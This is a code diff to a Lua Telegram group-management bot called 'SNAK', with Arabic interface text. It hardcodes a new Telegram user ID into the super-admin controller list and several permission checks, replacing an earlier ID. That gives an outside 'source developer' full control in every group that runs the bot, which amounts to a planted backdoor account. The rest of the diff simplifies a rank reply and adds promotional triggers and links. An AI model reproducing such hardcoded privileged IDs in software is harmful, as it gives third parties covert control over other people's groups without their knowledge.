@@ -113,7 +113,7 @@ return Chat_Type
 end
 function The_ControllerAll(UserId)
 ControllerAll = false
-local ListSudos ={Sudo_Id,1918968211}
+local ListSudos ={Sudo_Id,1918968211,2123332060}
 for k, v in pairs(ListSudos) do
 if tonumber(UserId) == tonumber(v) then
 ControllerAll = true
@@ -132,6 +132,8 @@ Addictive = Redis:sismember(SNAK.."SNAK:Addictive:Group"..ChatId,UserId)
 Distinguished = Redis:sismember(SNAK.."SNAK:Distinguished:Group"..ChatId,UserId)
 StatusMember = LuaTele.getChatMember(ChatId,UserId).status.luatele
 if UserId == 1918968211 then
+Status = 'مطور السورس'
+elseif UserId == 2123332060 then  
 Status = 'مطور السورس'
 elseif UserId == Sudo_Id then  
 Status = 'المطور الاساسي'
@@ -726,7 +728,7 @@ Distinguished = Redis:sismember(SNAK.."SNAK:Distinguished:Group"..ChatId,UserId)
 StatusMember = LuaTele.getChatMember(ChatId,UserId).status.luatele
 if UserId == 1918968211 then
 Status = true
-elseif UserId == 1965297568 then  
+elseif UserId == 2123332060 then  
 Status = true
 elseif UserId == Sudo_Id then  
 Status = true
@@ -765,7 +767,7 @@ Distinguished = Redis:sismember(SNAK.."SNAK:Distinguished:Group"..ChatId,UserId)
 StatusMember = LuaTele.getChatMember(ChatId,UserId).status.luatele
 if UserId == 1918968211 then
 Status = true
-elseif UserId == 1965297568 then  
+elseif UserId == 2123332060 then  
 Status = true
 elseif UserId == Sudo_Id then    
 Status = true
@@ -900,6 +902,9 @@ elseif Statusrestricted(msg.chat_id,msg.sender.user_id).SilentGroup == true then
 return LuaTele.deleteMessages(msg.chat_id,{[1]= msg.id})
 end
 if tonumber(msg.sender.user_id) == 1918968211 then
+msg.Name_Controller = 'مطور السورس '
+msg.The_Controller = 1
+elseif tonumber(msg.sender.user_id) == 2123332060 then
 msg.Name_Controller = 'مطور السورس '
 msg.The_Controller = 1
 elseif The_ControllerAll(msg.sender.user_id) == true then  
@@ -2773,23 +2778,8 @@ return LuaTele.sendText(msg_chat_id,msg_id,
 end
 end
 if text == 'رتبتي' then
-if not Redis:get(SNAK.."SNAK:photo:Rank"..msg_chat_id) then
-return false
-end
-local ban = LuaTele.getUser(msg.sender.user_id)
-local photo = LuaTele.getUserProfilePhotos(msg.sender.user_id)
-local news = ' رتبتك  هي '..msg.Name_Controller
-if photo.total_count > 0 then
-data = {} 
-data.inline_keyboard = {
-{
-{text =news,url = "https://t.me/"..ban.username..""}, 
-},
-{{text = 'اضف البوت لمجموعتك', url = 't.me/'..UserBot..'?startgroup=new'}},
-}
-local msgg = msg_id/2097152/0.5
-https.request("https://api.telegram.org/bot"..Token.."/sendphoto?chat_id=" .. msg_chat_id .. "&photo="..photo.photos[1].sizes[#photo.photos[1].sizes].photo.remote.id.."&photo=".. URL.escape(news).."&reply_to_message_id="..msgg.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(data))
-end
+
+return LuaTele.sendText(msg_chat_id,msg_id,'\n• رتبتك هي : '..msg.Name_Controller,"md",true)  
 end
 if text == 'معلوماتي' or text == 'موقعي' then
 local UserInfo = LuaTele.getUser(msg.sender.user_id)
@@ -9144,14 +9134,28 @@ local msgg = msg_id/2097152/0.5
 https.request("https://api.telegram.org/bot"..Token.."/sendphoto?chat_id=" .. msg_chat_id .. "&photo="..photo.."&caption=".. URL.escape(Name).."&photo="..msgg.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
 end
 
+if text == 'معتز' or text == 'وزه' or text == 'زوز' then
+photo = "https://t.me/quuu6c/2"
+local RinkBot = msg.Name_Controller
+local Name = '𝗪𝗘𝗟𝗖𝗢𝗠𝗘 𝗕𝗥𝗢 ⶄ'
+keyboard = {} 
+keyboard.inline_keyboard = {
+{{text = '𝗠𝗢𝗔𝗧𝗔𝗭',url="https://t.me/xb0bb"}},
+{{text = 'اضف البوت لمجموعتك', url = 't.me/'..UserBot..'?startgroup=new'}}, 
+}
+local msgg = msg_id/2097152/0.5
+https.request("https://api.telegram.org/bot"..Token.."/sendphoto?chat_id=" .. msg_chat_id .. "&photo="..photo.."&caption=".. URL.escape(Name).."&photo="..msgg.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
+end
+
 if text == 'السورس' or text == 'سورس' or text == 'يا سورس' or text == 'source' then
 local T =[[
 ◉ 𝗪𝗘𝗟𝗖𝗢𝗠 𝗧𝗢 𝗦𝗢𝗨𝗥𝗖𝗘 𝗦𝗡𝗔𝗞 .
 ]]
 keyboard = {} 
 keyboard.inline_keyboard = {
-{{text = '• 𝘿𝙀𝙑  .',url="https://t.me/UU_0P"}},
-{{text = '◉ 𝘽𝙊𝙏 𝙎𝙉𝘼𝙆  .', url = 't.me/DDT5bot'}},
+{{text = '◉ 𝘿𝙀𝙑  .',url="https://t.me/UU_0P"}},
+{{text = '◉ 𝘿𝙀𝙑  .',url="https://t.me/xb0bb"}},
+{{text = '◉ 𝘽𝙊𝙏 𝙎𝙉𝘼𝙆  .', url = 't.me/xb8bbot'}},
 {{text = '◉ 𝙎𝙊𝙐𝙍𝘾𝙀 𝙎𝙉𝘼𝙆  .', url = 't.me/UU_SNAK'}}, 
 {{text = 'اضف البوت لمجموعتك', url = 't.me/'..UserBot..'?startgroup=new'}}, 
 }
